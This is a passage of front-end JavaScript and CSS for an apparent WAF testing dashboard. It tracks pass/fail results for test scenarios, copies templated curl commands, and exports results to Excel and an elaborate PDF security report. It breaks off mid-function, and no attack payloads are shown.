                            <i class="fas fa-sticky-note"></i> Test Notes
                        </div>
                        <textarea class="notes-input" 
                                  placeholder="Add notes about test results, WAF behavior, observations..." 
                                  onchange="updateTestNotes('${test.id}', this.value)">${result.notes || ''}</textarea>
                    </div>
                </div>
            `;
        }

        // Get test overall status
        function getTestOverallStatus(test, result) {
            if (!result.scenarios) return 'pending';
            
            const statuses = test.scenarios.map(s => result.scenarios[s.id] || 'pending');
            
            if (statuses.every(s => s === 'passed')) return 'passed';
            if (statuses.every(s => s === 'failed')) return 'failed';
            if (statuses.every(s => s === 'skipped')) return 'skipped';
            if (statuses.some(s => s !== 'pending')) return 'partial';
            
            return 'pending';
        }

        // Render scenario item
        function renderScenarioItem(testId, scenario, testResult) {
            const status = testResult.scenarios ? testResult.scenarios[scenario.id] : null;
            const statusClass = status ? `status-${status}` : '';

            return `
                <div class="scenario-item ${statusClass}">
                    <div class="scenario-header">
                        <div class="scenario-info">
                            <div class="scenario-name">${scenario.name}</div>
                            <div class="scenario-description">${scenario.description}</div>
                        </div>
                        <div class="scenario-status">
                            <button class="scenario-action-btn pass-btn" onclick="updateScenarioStatus('${testId}', '${scenario.id}', 'passed')" title="Pass">
                                <i class="fas fa-check"></i>
                            </button>
                            <button class="scenario-action-btn fail-btn" onclick="updateScenarioStatus('${testId}', '${scenario.id}', 'failed')" title="Fail">
                                <i class="fas fa-times"></i>
                            </button>
                            <button class="scenario-action-btn skip-btn" onclick="updateScenarioStatus('${testId}', '${scenario.id}', 'skipped')" title="Skip">
                                <i class="fas fa-forward"></i>
                            </button>
                        </div>
                    </div>
                    <div class="code-section">
                        <div class="code-header">
                            <div class="code-label">
                                <i class="fas fa-terminal"></i> Command
                            </div>
                            <button class="copy-btn" onclick="copyScenarioCommand('${testId}', '${scenario.id}')">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>
                        <div class="code-block">
                            <code class="code-content">${scenario.curl.replace(/TARGET_HOST/g, settings.targetHost)}</code>
                        </div>
                    </div>
                </div>
            `;
        }

        // Update scenario status
        function updateScenarioStatus(testId, scenarioId, status) {
            if (!testResults[testId]) {
                testResults[testId] = {
                    scenarios: {},
                    timestamp: new Date().toISOString()
                };
            }
            
            if (!testResults[testId].scenarios) {
                testResults[testId].scenarios = {};
            }
            
            testResults[testId].scenarios[scenarioId] = status;
            testResults[testId].timestamp = new Date().toISOString();
            
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
            updateStats();
            renderTests();
            showToast(`Scenario marked as ${status}!`);
        }

        // Update all scenarios for a test
        function updateAllScenarios(testId, status) {
            const test = Object.values(tests).flat().find(t => t.id === testId);
            if (!test) return;

            if (!testResults[testId]) {
                testResults[testId] = {
                    scenarios: {},
                    timestamp: new Date().toISOString()
                };
            }

            test.scenarios.forEach(scenario => {
                testResults[testId].scenarios[scenario.id] = status;
            });
            
            testResults[testId].timestamp = new Date().toISOString();
            
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
            updateStats();
            renderTests();
            showToast(`All scenarios marked as ${status}!`);
        }

        // Clear test results
        function clearTest(testId) {
            delete testResults[testId];
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
            updateStats();
            renderTests();
            showToast('Test results cleared!');
        }

        // Update test notes
        function updateTestNotes(testId, notes) {
            if (!testResults[testId]) {
                testResults[testId] = {
                    scenarios: {},
                    timestamp: new Date().toISOString()
                };
            }
            testResults[testId].notes = notes;
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
        }

        // Copy scenario command
        function copyScenarioCommand(testId, scenarioId) {
            const test = Object.values(tests).flat().find(t => t.id === testId);
            const scenario = test.scenarios.find(s => s.id === scenarioId);
            
            if (scenario) {
                const command = scenario.curl.replace(/TARGET_HOST/g, settings.targetHost);
                navigator.clipboard.writeText(command).then(() => {
                    showToast('Command copied to clipboard!');
                }).catch(err => {
                    // Fallback for older browsers
                    const textarea = document.createElement('textarea');
                    textarea.value = command;
                    textarea.style.position = 'fixed';
                    textarea.style.left = '-999999px';
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    showToast('Command copied to clipboard!');
                });
            }
        }

        // Filter tests
        function filterTests(filter) {
            currentFilter = filter;
            
            // Update button states
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.querySelector(`[data-filter="${filter}"]`).classList.add('active');
            
            renderTests();
        }

        // Export to Excel
        function exportToExcel() {
            const workbook = XLSX.utils.book_new();
            const exportData = [];
            
            // Headers
            exportData.push([
                'Category',
                'Test ID',
                'Test Name',
                'Severity',
                'Description',
                'Scenario ID',
                'Scenario Name',
                'Scenario Description',
                'Command',
                'Status',
                'Notes',
                'Timestamp'
            ]);
            
            // Data
            Object.entries(tests).forEach(([category, categoryTests]) => {
                categoryTests.forEach(test => {
                    const result = testResults[test.id] || {};
                    test.scenarios.forEach(scenario => {
                        const status = result.scenarios ? result.scenarios[scenario.id] : 'Pending';
                        exportData.push([
                            category,
                            test.id,
                            test.name,
                            test.severity,
                            test.description,
                            scenario.id,
                            scenario.name,
                            scenario.description,
                            scenario.curl.replace(/TARGET_HOST/g, settings.targetHost),
                            status || 'Pending',
                            result.notes || '',
                            result.timestamp || ''
                        ]);
                    });
                });
            });
            
            const worksheet = XLSX.utils.aoa_to_sheet(exportData);
            
            // Set column widths
            worksheet['!cols'] = [
                { wch: 20 }, // Category
                { wch: 12 }, // Test ID
                { wch: 30 }, // Test Name
                { wch: 10 }, // Severity
                { wch: 40 }, // Description
                { wch: 15 }, // Scenario ID
                { wch: 25 }, // Scenario Name
                { wch: 35 }, // Scenario Description
                { wch: 60 }, // Command
                { wch: 10 }, // Status
                { wch: 40 }, // Notes
                { wch: 20 }  // Timestamp
            ];
            
            XLSX.utils.book_append_sheet(workbook, worksheet, 'WAF Test Results');
            
            // Summary sheet
            const summaryData = [
                ['WAF Testing Summary Report'],
                ['Generated:', new Date().toLocaleString()],
                ['Target Host:', settings.targetHost],
                [''],
                ['Overall Statistics'],
                ['Total Tests:', Object.values(tests).flat().length],
                ['Total Scenarios:', Object.values(tests).flat().reduce((acc, test) => acc + test.scenarios.length, 0)],
                [''],
                ['Results by Status']
            ];
            
            const stats = {
                passed: 0,
                failed: 0,
                skipped: 0,
                pending: 0
            };
            
            Object.values(tests).flat().forEach(test => {
                const result = testResults[test.id];
                if (result && result.scenarios) {
                    test.scenarios.forEach(scenario => {
                        const status = result.scenarios[scenario.id] || 'pending';
                        stats[status]++;
                    });
                } else {
                    stats.pending += test.scenarios.length;
                }
            });
            
            summaryData.push(['Passed:', stats.passed]);
            summaryData.push(['Failed:', stats.failed]);
            summaryData.push(['Skipped:', stats.skipped]);
            summaryData.push(['Pending:', stats.pending]);
            summaryData.push(['']);
            summaryData.push(['Results by Severity']);
            
            const severityStats = {
                critical: { total: 0, passed: 0, failed: 0 },
                high: { total: 0, passed: 0, failed: 0 },
                medium: { total: 0, passed: 0, failed: 0 },
                low: { total: 0, passed: 0, failed: 0 }
            };
            
            Object.values(tests).flat().forEach(test => {
                const result = testResults[test.id];
                severityStats[test.severity].total += test.scenarios.length;
                
                if (result && result.scenarios) {
                    test.scenarios.forEach(scenario => {
                        const status = result.scenarios[scenario.id];
                        if (status === 'passed') severityStats[test.severity].passed++;
                        else if (status === 'failed') severityStats[test.severity].failed++;
                    });
                }
            });
            
            Object.entries(severityStats).forEach(([severity, stats]) => {
                summaryData.push([
                    `${severity.toUpperCase()}:`,
                    `Total: ${stats.total}`,
                    `Passed: ${stats.passed}`,
                    `Failed: ${stats.failed}`
                ]);
            });
            
            const summarySheet = XLSX.utils.aoa_to_sheet(summaryData);
            summarySheet['!cols'] = [{ wch: 20 }, { wch: 15 }, { wch: 15 }, { wch: 15 }];
            XLSX.utils.book_append_sheet(workbook, summarySheet, 'Summary');
            
            // Save file
            const filename = `WAF_Test_Results_${new Date().toISOString().split('T')[0]}.xlsx`;
            XLSX.writeFile(workbook, filename);
            
            showToast('Results exported successfully!');
        }

        // Reset all results
        function resetAllResults() {
            if (confirm('Are you sure you want to reset all test results? This action cannot be undone.')) {
                testResults = {};
                localStorage.removeItem('wafTestResults');
                updateStats();
                renderTests();
                showToast('All results have been reset!');
            }
        }

        // Show settings modal
        function showSettings() {
            const modalHtml = `
                <div class="modal active" id="settings-modal">
                    <div class="modal-content">
                        <h2 style="margin-bottom: 1.5rem; color: var(--gray-900);">
                            <i class="fas fa-cog"></i> Settings
                        </h2>
                        <div style="margin-bottom: 1.5rem;">
                            <label style="display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--gray-700);">
                                Target Host
                            </label>
                            <input type="text" 
                                   id="target-host-input" 
                                   value="${settings.targetHost}"
                                   placeholder="e.g., example.com or 192.168.1.100"
                                   style="width: 100%; padding: 0.75rem; border: 2px solid var(--gray-200); border-radius: 8px; font-size: 1rem;">
                            <p style="margin-top: 0.5rem; font-size: 0.875rem; color: var(--gray-600);">
                                Enter the target host for testing. This will replace TARGET_HOST in all curl commands.
                            </p>
                        </div>
                        <div style="margin-bottom: 1.5rem;">
                            <h3 style="margin-bottom: 0.75rem; color: var(--gray-800);">
                                <i class="fas fa-info-circle"></i> About
                            </h3>
                            <p style="font-size: 0.875rem; color: var(--gray-600); line-height: 1.6;">
                                WAF Testing Suite v1.0 - Comprehensive testing platform for Radware Alteon WAF configurations.
                                This tool helps security professionals validate WAF rules and identify potential bypasses.
                            </p>
                        </div>
                        <div style="margin-bottom: 1.5rem;">
                            <h3 style="margin-bottom: 0.75rem; color: var(--gray-800);">
                                <i class="fas fa-chart-bar"></i> Statistics
                            </h3>
                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.75rem; font-size: 0.875rem;">
                                <div style="padding: 0.75rem; background: var(--gray-50); border-radius: 6px;">
                                    <div style="color: var(--gray-600);">Total Categories</div>
                                    <div style="font-weight: 600; color: var(--gray-900);">${Object.keys(tests).length}</div>
                                </div>
                                <div style="padding: 0.75rem; background: var(--gray-50); border-radius: 6px;">
                                    <div style="color: var(--gray-600);">Total Tests</div>
                                    <div style="font-weight: 600; color: var(--gray-900);">${Object.values(tests).flat().length}</div>
                                </div>
                                <div style="padding: 0.75rem; background: var(--gray-50); border-radius: 6px;">
                                    <div style="color: var(--gray-600);">Total Scenarios</div>
                                    <div style="font-weight: 600; color: var(--gray-900);">${Object.values(tests).flat().reduce((acc, test) => acc + test.scenarios.length, 0)}</div>
                                </div>
                                <div style="padding: 0.75rem; background: var(--gray-50); border-radius: 6px;">
                                    <div style="color: var(--gray-600);">Last Update</div>
                                    <div style="font-weight: 600; color: var(--gray-900);">${new Date().toLocaleDateString()}</div>
                                </div>
                            </div>
                        </div>
                        <div style="display: flex; gap: 0.75rem; justify-content: flex-end;">
                            <button onclick="closeSettings()" 
                                    style="padding: 0.75rem 1.5rem; background: var(--gray-200); color: var(--gray-700); border: none; border-radius: 8px; cursor: pointer; font-weight: 500;">
                                Cancel
                            </button>
                            <button onclick="saveSettings()" 
                                    style="padding: 0.75rem 1.5rem; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 500;">
                                Save Settings
                            </button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', modalHtml);
        }

        // Close settings
        function closeSettings() {
            const modal = document.getElementById('settings-modal');
            if (modal) {
                modal.remove();
            }
        }

        // Save settings
        function saveSettings() {
            const targetHost = document.getElementById('target-host-input').value.trim();
            if (targetHost) {
                settings.targetHost = targetHost;
                localStorage.setItem('targetHost', targetHost);
                closeSettings();
                renderTests();
                showToast('Settings saved successfully!');
            } else {
                showToast('Please enter a valid target host!');
            }
        }

        // Show toast notification
        function showToast(message) {
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toast-message');
            
            toastMessage.textContent = message;
            toast.classList.add('active');
            
            setTimeout(() => {
                toast.classList.remove('active');
            }, 3000);
        }

        // Handle keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            // Ctrl/Cmd + S to save/export
            if ((e.ctrlKey || e.metaKey) && e.key === 's') {
                e.preventDefault();
                exportToExcel();
            }
            
            // Ctrl/Cmd + F to focus search
            if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
                e.preventDefault();
                document.getElementById('search').focus();
            }
            
            // Escape to close modals
            if (e.key === 'Escape') {
                closeSettings();
            }
        });

        // Initialize the application
        document.addEventListener('DOMContentLoaded', init);

        // Auto-save every 30 seconds
        setInterval(() => {
            if (Object.keys(testResults).length > 0) {
                localStorage.setItem('wafTestResults', JSON.stringify(testResults));
            }
        }, 30000);

        // Add responsive handling
        window.addEventListener('resize', () => {
            // Handle any responsive adjustments if needed
        });

        // Export functions for console access (debugging)
        window.wafTester = {
            tests,
            testResults,
            exportToExcel,
            resetAllResults,
            updateStats,
            renderTests
        };
    </script>































<!-- Add these additional CDN links for charts and enhanced visuals -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-datalabels/2.2.0/chartjs-plugin-datalabels.min.js"></script>

<!-- Enhanced CSS for the floating button and UI -->
<style>
    /* Enhanced Floating PDF Button */
    .floating-pdf-btn {
        position: fixed;
        bottom: 2rem;
        right: 2rem;
        width: 65px;
        height: 65px;
        background: linear-gradient(135deg, #dc2626 0%, #ef4444 50%, #f87171 100%);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4), 0 0 40px rgba(239, 68, 68, 0.1);
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        z-index: 1000;
        overflow: hidden;
    }

    .floating-pdf-btn::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
        transform: rotate(45deg);
        transition: all 0.5s;
    }

    .floating-pdf-btn:hover {
        transform: translateY(-5px) scale(1.05);
        box-shadow: 0 8px 30px rgba(239, 68, 68, 0.5), 0 0 60px rgba(239, 68, 68, 0.2);
    }

    .floating-pdf-btn:hover::before {
        animation: shine 0.5s ease-in-out;
    }

    @keyframes shine {
        0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
        100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
    }

    .floating-pdf-btn i {
        color: white;
        font-size: 1.75rem;
        z-index: 1;
    }

    .pdf-generating {
        animation: pulse 1.5s infinite, rotate 2s linear infinite;
    }

    @keyframes pulse {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.1); }
    }

    @keyframes rotate {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    /* Canvas container for temporary chart rendering */
    .hidden-canvas-container {
        position: fixed;
        left: -9999px;
        top: -9999px;
        width: 800px;
        height: 400px;
    }
</style>

<!-- Enhanced floating button -->
<button class="floating-pdf-btn" onclick="generateAdvancedPDFReport()" title="Generate Advanced PDF Report">
    <i class="fas fa-file-pdf"></i>
</button>

<!-- Hidden canvas container for chart generation -->
<div class="hidden-canvas-container" id="chartContainer">
    <canvas id="tempChart"></canvas>
</div>

<!-- Advanced PDF Report Generator Script -->
<script>
// Enhanced PDF Report Generator with Advanced Visualizations
async function generateAdvancedPDFReport() {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF({
        orientation: 'portrait',
        unit: 'mm',
        format: 'a4'
    });
    
    // Show generating indicator
    const pdfBtn = document.querySelector('.floating-pdf-btn');
    pdfBtn.classList.add('pdf-generating');
    showToast('Generating advanced PDF report...');
    
    try {
        // Prepare comprehensive report data
        const reportData = prepareAdvancedReportData();
        
        // 1. Professional Cover Page
        await addProfessionalCoverPage(doc, reportData);
        
        // 2. Executive Dashboard
        doc.addPage();
        await addExecutiveDashboard(doc, reportData);
        
        // 3. Security Score Card
        doc.addPage();
        await addSecurityScoreCard(doc, reportData);
        
        // 4. Risk Heat Map
        doc.addPage();
        await addRiskHeatMap(doc, reportData);
        
        // 5. Advanced Test Matrix
        doc.addPage();
        await addAdvancedTestMatrix(doc, reportData);
        
        // 6. Vulnerability Distribution Charts
        doc.addPage();
        await addVulnerabilityCharts(doc, reportData);
        
        // 7. Category Performance Analysis
        doc.addPage();
        await addCategoryPerformanceAnalysis(doc, reportData);
        
        // 8. Severity Trend Analysis
        doc.addPage();
        await addSeverityTrendAnalysis(doc, reportData);
        
        // 9. Detailed Findings Report
        await addDetailedFindingsReport(doc, reportData);
        
        // 10. Attack Vector Analysis
        doc.addPage();
        await addAttackVectorAnalysis(doc, reportData);
        
        // 11. Compliance Mapping
        doc.addPage();
        await addComplianceMapping(doc, reportData);
        
        // 12. Remediation Roadmap
        doc.addPage();
        await addRemediationRoadmap(doc, reportData);
        
        // 13. Technical Appendix
        await addTechnicalAppendix(doc, reportData);
        
        // Add watermark to all pages
        addWatermarkToAllPages(doc);
        
        // Save the PDF
        const filename = `WAF_Advanced_Security_Report_${new Date().toISOString().split('T')[0]}.pdf`;
        doc.save(filename);
        
        showToast('Advanced PDF report generated successfully!');
    } catch (error) {
        console.error('PDF generation error:', error);
        showToast('Error generating PDF report!');
    } finally {
        pdfBtn.classList.remove('pdf-generating');
    }
}

// Prepare advanced report data with additional analytics
function prepareAdvancedReportData() {
    const baseData = prepareReportData();
    
    // Add advanced analytics
    baseData.analytics = {
        riskScore: calculateAdvancedRiskScore(baseData),
        securityPosture: calculateSecurityPosture(baseData),
        maturityLevel: calculateMaturityLevel(baseData),
        complianceScore: calculateComplianceScore(baseData),
        trendAnalysis: generateTrendAnalysis(baseData),
        attackVectors: analyzeAttackVectors(baseData),
        vulnerabilityDistribution: calculateVulnerabilityDistribution(baseData)
    };
    
    return baseData;
}

// Professional Cover Page with gradient and modern design
async function addProfessionalCoverPage(doc, data) {
    // Gradient background
    const gradient = doc.setGradientFill({
        type: 'linear',
        x1: 0, y1: 0, x2: 210, y2: 297,
        colorStops: [
            { offset: 0, color: [15, 23, 42] },    // slate-900
            { offset: 0.5, color: [30, 41, 59] },   // slate-800
            { offset: 1, color: [51, 65, 85] }      // slate-700
        ]
    });
    doc.rect(0, 0, 210, 297, 'F');
    
    // Decorative elements
    doc.setDrawColor(99, 102, 241);
    doc.setLineWidth(0.5);
    
    // Top corner design
    for (let i = 0; i < 5; i++) {
        doc.setDrawColor(99, 102, 241, 0.3 - (i * 0.05));
        doc.line(0, i * 10, 50 - (i * 10), 0);
        doc.line(210, i * 10, 160 + (i * 10), 0);
    }
    
    // Logo area with shield icon
    doc.setFillColor(99, 102, 241);
    doc.circle(105, 60, 25, 'F');
    
    // Inner circle
    doc.setFillColor(255, 255, 255, 0.1);
    doc.circle(105, 60, 20, 'F');
    
    // Shield icon simulation
    doc.setFillColor(255, 255, 255);
    doc.setFontSize(30);
    doc.text('🛡️', 105, 70, { align: 'center' });
    
    // Main title with gradient effect
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(42);
    doc.setFont(undefined, 'bold');
    doc.text('WAF SECURITY', 105, 110, { align: 'center' });
    
    doc.setFontSize(32);
    doc.setFont(undefined, 'normal');
    doc.text('ASSESSMENT REPORT', 105, 125, { align: 'center' });
    
    // Subtitle line
    doc.setDrawColor(99, 102, 241);
    doc.setLineWidth(0.5);
    doc.line(40, 135, 170, 135);
    
    // Report type
    doc.setFontSize(16);
    doc.setTextColor(156, 163, 175);
    doc.text('Comprehensive Vulnerability Analysis', 105, 150, { align: 'center' });
    doc.text('Radware Alteon WAF', 105, 160, { align: 'center' });
    
    // Metadata section with modern card design
    doc.setFillColor(255, 255, 255, 0.05);
    doc.roundedRect(30, 180, 150, 70, 5, 5, 'F');
    
    // Metadata border
    doc.setDrawColor(99, 102, 241, 0.3);
    doc.setLineWidth(0.5);
    doc.roundedRect(30, 180, 150, 70, 5, 5, 'S');
    
    // Metadata content
    doc.setFontSize(12);
    doc.setTextColor(255, 255, 255);
    
    const metadata = [
        { label: 'Target System:', value: data.metadata.targetHost },
        { label: 'Assessment Date:', value: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }) },
        { label: 'Report Version:', value: 'v2.0 Advanced' },
        { label: 'Classification:', value: 'CONFIDENTIAL' }
    ];
    
    let y = 195;
    metadata.forEach(item => {
        doc.setFont(undefined, 'normal');
        doc.setTextColor(156, 163, 175);
        doc.text(item.label, 40, y);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(255, 255, 255);
        doc.text(item.value, 120, y);
        y += 12;
    });
    
    // Footer with security classification
    doc.setFillColor(239, 68, 68, 0.1);
    doc.rect(0, 270, 210, 27, 'F');
    
    doc.setTextColor(239, 68, 68);
    doc.setFontSize(10);
    doc.setFont(undefined, 'bold');
    doc.text('CONFIDENTIAL - SECURITY ASSESSMENT', 105, 280, { align: 'center' });
    
    doc.setTextColor(156, 163, 175);
    doc.setFontSize(8);
    doc.setFont(undefined, 'normal');
    doc.text('This document contains sensitive security information. Handle according to data classification policies.', 105, 287, { align: 'center' });
}

// Executive Dashboard with key metrics and visualizations
async function addExecutiveDashboard(doc, data) {
    // Header
    addSectionHeader(doc, 'Executive Dashboard', 'At-a-Glance Security Overview');
    
    // Key Metrics Cards
    const metrics = [
        {
            title: 'Security Score',
            value: `${data.analytics.riskScore}%`,
            subtitle: data.analytics.securityPosture,
            color: getScoreColor(data.analytics.riskScore),
            icon: '🛡️'
        },
        {
            title: 'Tests Completed',
            value: `${Math.round((data.statistics.passed + data.statistics.failed + data.statistics.skipped) / data.metadata.totalScenarios * 100)}%`,
            subtitle: `${data.statistics.passed + data.statistics.failed + data.statistics.skipped} of ${data.metadata.totalScenarios}`,
            color: [99, 102, 241],
            icon: '✓'
        },
        {
            title: 'Critical Issues',
            value: data.statistics.critical.failed,
            subtitle: 'Require immediate attention',
            color: [239, 68, 68],
            icon: '⚠️'
        },
        {
            title: 'Compliance',
            value: `${data.analytics.complianceScore}%`,
            subtitle: data.analytics.maturityLevel,
            color: [16, 185, 129],
            icon: '📋'
        }
    ];
    
    // Draw metric cards
    let x = 20;
    let y = 60;
    const cardWidth = 85;
    const cardHeight = 40;
    
    metrics.forEach((metric, index) => {
        if (index === 2) {
            x = 20;
            y = 110;
        }
        
        // Card background
        doc.setFillColor(248, 250, 252);
        doc.roundedRect(x, y, cardWidth, cardHeight, 3, 3, 'F');
        
        // Card border
        doc.setDrawColor(...metric.color);
        doc.setLineWidth(0.5);
        doc.roundedRect(x, y, cardWidth, cardHeight, 3, 3, 'S');
        
        // Icon background
        doc.setFillColor(...metric.color, 0.1);
        doc.roundedRect(x + 5, y + 5, 30, 30, 3, 3, 'F');
        
        // Icon
        doc.setFontSize(16);
        doc.text(metric.icon, x + 20, y + 23, { align: 'center' });
        
        // Title
        doc.setFontSize(9);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(100, 116, 139);
        doc.text(metric.title, x + 40, y + 12);
        
        // Value
        doc.setFontSize(18);
        doc.setFont(undefined, 'bold');
        doc.setTextColor(...metric.color);
        doc.text(metric.value, x + 40, y + 23);
        
        // Subtitle
        doc.setFontSize(8);
        doc.setFont(undefined, 'normal');
        doc.setTextColor(148, 163, 184);
        doc.text(metric.subtitle, x + 40, y + 30);
        
        x += 90;
    });
    
    // Risk Distribution Chart
    y = 160;
    doc.setFontSize(12);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(31, 41, 55);
    doc.text('Risk Distribution Overview', 20, y);
    
    // Create visual risk distribution
    await addRiskDistributionChart(doc, data, 20, y + 10);
}

// Security Score Card with detailed metrics
async function addSecurityScoreCard(doc, data) {
    addSectionHeader(doc, 'Security Score Card', 'Comprehensive Security Metrics');
    
    // Calculate detailed scores
    const scores = {
        overall: data.analytics.riskScore,
        inputValidation: calculateCategoryScore(data, ['URI', 'Parameters', 'Headers']),
        fileUpload: calculateCategoryScore(data, ['File Upload']),
        encoding: calculateCategoryScore(data, ['UTF8/Unicode', 'URI Encoding']),
        configuration: calculateCategoryScore(data, ['JSON Parsing', 'HTTP Headers']),
        pathTraversal: calculateCategoryScore(data, ['Directory'])
    };
    
    // Visual score card with radar chart effect
    const centerX = 105;
    const centerY = 120;
    const radius = 50;
    
    // Draw radar chart background
    doc.setDrawColor(226, 232, 240);
    doc.setLineWidth(0.5);
    
    // Draw concentric hexagons
    for (let i = 1; i <= 5; i++) {
        const r = radius * (i / 5);
        drawHexagon(doc, centerX, centerY, r);
    }
    
    // Draw axes
    const categories = Object.keys(scores).slice(1);
    const angleStep = (Math.PI * 2) / categories.length;
    
    categories.forEach((cat, index) => {
        const angle = index * angleStep - Math.PI / 2;
        const x = centerX + Math.cos(angle) * radius;
        const y = centerY + Math.sin(angle) * radius;
        
        doc.setDrawColor(203, 213, 225);
        doc.line(centerX, centerY, x, y);
        
        // Labels
        doc.setFontSize(9);
        doc.setTextColor(71, 85, 105);
        const labelX = centerX + Math.cos(angle) * (radius + 15);
        const labelY = centerY + Math.sin(angle) * (radius + 15);
        doc.text(formatCategoryName(cat), labelX, labelY, { align: 'center' });
    });
    
    // Draw score polygon
    doc.setFillColor(99, 102, 241, 0.2);
    doc.setDrawColor(99, 102, 241);
    doc.setLineWidth(2);
    
    const polygon = [];
    categories.forEach((cat, index) => {
        const angle = index * angleStep - Math.PI / 2;
        const score = scores[cat] / 100;
        const x = centerX + Math.cos(angle) * radius * score;
        const y = centerY + Math.sin(angle) * radius * score;
        polygon.push([x, y]);
    });
    
    // Draw filled polygon
    doc.setFillColor(99, 102, 241, 0.1);
    drawPolygon(doc, polygon, 'F');
    doc.setDrawColor(99, 102, 241);
    doc.setLineWidth(2);
    drawPolygon(doc, polygon, 'S');
    
    // Score points
    polygon.forEach(point => {
        doc.setFillColor(99, 102, 241);
        doc.circle(point[0], point[1], 2, 'F');
    });
    
    // Overall score in center
    doc.setFillColor(255, 255, 255);
    doc.circle(centerX, centerY, 25, 'F');
    doc.setTextColor(99, 102, 241);
    doc.setFontSize(24);
    doc.setFont(undefined, 'bold');
    doc.text(`${scores.overall}`, centerX, centerY + 7, { align: 'center' });
    doc.setFontSize(10);
    doc.setFont(undefined, 'normal');
    doc.text('Overall', centerX, centerY - 5, { align: 'center' });
    
    // Detailed metrics table
    y = 200;
    const metricsData = [
        ['Security Domain', 'Score', 'Status', 'Findings'],
        ['Input Validation', `${scores.inputValidation}%`, getStatus(scores.inputValidation), `${countFailures(data, ['URI', 'Parameters', 'Headers'])} issues`],
        ['File Upload Security', `${scores.fileUpload}%`, getStatus(scores.fileUpload), `${countFailures(data, ['File Upload'])} issues`],
        ['Encoding Validation', `${scores.encoding}%`, getStatus(scores.encoding), `${countFailures(data, ['UTF8/Unicode', 'URI Encoding'])} issues`],
        ['Configuration Security', `${scores.configuration}%`, getStatus(scores.configuration), `${countFailures(data, ['JSON Parsing', 'HTTP Headers'])} issues`],
        ['Path Traversal Protection', `${scores.pathTraversal}%`, getStatus(scores.pathTraversal), `${countFailures(data, ['Directory'])} issues`]
    ];
    
    doc.autoTable({
        startY: y,
        head: [metricsData[0]],
        body: metricsData.slice(1),
        theme: 'grid',
        headStyles: {
            fillColor: [31, 41, 55],
            textColor: 255,
            fontSize: 10,
            fontStyle: 'bold'
        },
        bodyStyles: {
            fontSize: 9
        },
        columnStyles: {
            0: { cellWidth: 60 },
            1: { cellWidth: 30, halign: 'center', fontStyle: 'bold' },
            2: { cellWidth: 40, halign: 'center' },
            3: { cellWidth: 40, halign: 'center' }
        },
        didDrawCell: function(data) {
            if (data.column.index === 2 && data.row.index >= 0) {
                const status = data.cell.text[0];
                let color = [0, 0, 0];
                if (status === 'Critical') color = [239, 68, 68];
                else if (status === 'Poor') color = [251, 146, 60];
                else if (status === 'Fair') color = [245, 158, 11];
                else if (status === 'Good') color = [34, 197, 94];
                else if (status === 'Excellent') color = [16, 185, 129];
                
                doc.setTextColor(...color);
            }
        }
    });
}

// Risk Heat Map visualization
async function addRiskHeatMap(doc, data) {
    addSectionHeader(doc, 'Risk Heat Map', 'Vulnerability Severity by Category');
    
    // Prepare heat map data
    const categories = Object.keys(tests);
    const severities = ['critical', 'high', 'medium', 'low'];
    const heatMapData = [];
    
    categories.forEach(category => {
        const row = [];
        severities.forEach(severity => {
            const count = countCategorySeverityFailures(data, category, severity);
            row.push(count);
        });
        heatMapData.push(row);
    });
    
    // Draw heat map
    const cellWidth = 35;
    const cellHeight = 15;
    const startX = 30;
    const startY = 70;
    
    // Headers
    doc.setFontSize(10);
    doc.setFont(undefined, 'bold');
    doc.setTextColor(71, 85, 105);
    
    severities.forEach((severity, index) => {
        doc.text(severity.toUpperCase(), startX + 60 + (index * cellWidth) + cellWidth/2, startY - 5, { align: 'center' });
    });
    
    // Category labels and heat map cells
    categories.forEach((category, rowIndex) => {
        // Category label
        doc.setFontSize(9);
        doc.setTextColor(71, 85, 105);
        const categoryLabel = category.length > 15 ? category.substring(0, 15) + '...' : category;
        doc.text(categoryLabel, startX, startY + (rowIndex * cellHeight) + cellHeight/2 + 3);
        
        // Heat map cells
        heatMapData[rowIndex].forEach((value, colIndex) => {
            const intensity = Math.min(value / 5, 1); // Normalize to 0-1
            const color = getHeatMapColor(intensity, severities[colIndex]);
            
            doc.setFillColor(...color);
            doc.rect(startX + 60 + (colIndex * cellWidth), startY + (rowIndex * cellHeight), cellWidth - 2, cellHeight - 2, 'F');
            
            // Value text
            if (value > 0) {
                doc.setTextColor(intensity > 0.5 ? 255 : 0);
                doc.setFontSize(10);
                doc.setFont(undefined, 'bold');
                doc.text(value.toString(), startX + 60 + (colIndex * cellWidth) + cellWidth/2 - 1, startY + (rowIndex * cellHeight) + cellHeight/2 + 3, { align: 'center' });
            }
        });
    });
    
    // Legend
